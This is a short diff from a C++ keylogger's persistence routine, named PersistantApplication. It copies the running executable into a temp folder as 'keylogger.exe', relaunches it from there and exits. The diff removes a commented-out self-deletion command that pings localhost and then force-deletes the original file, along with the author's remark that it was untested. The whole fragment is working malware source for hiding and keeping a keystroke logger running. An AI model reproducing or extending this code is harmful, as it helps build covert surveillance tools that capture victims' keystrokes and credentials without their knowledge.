@@ -31,8 +31,6 @@ bool PersistantApplication() {
 	} else {
 		STARTUPINFOA si{sizeof(si)};
 		PROCESS_INFORMATION pi{};
-		//system(("cmd /c ping localhost -n 2 & del /f /q "+exeDir).c_str());
-		// Note for me [!] : I  didn't test this code line because of my compiler (g++) won't start cmd.exe :( but it should work
 		CopyFileExA(exePath, (tempDir + "keylogger.exe").c_str(), NULL, NULL, FALSE, 0);
 		CreateProcessA((tempDir + "keylogger.exe").c_str(), NULL, NULL, NULL, FALSE, 0, NULL, (tempDir.c_str()), &si, &pi);
 		exit(0);
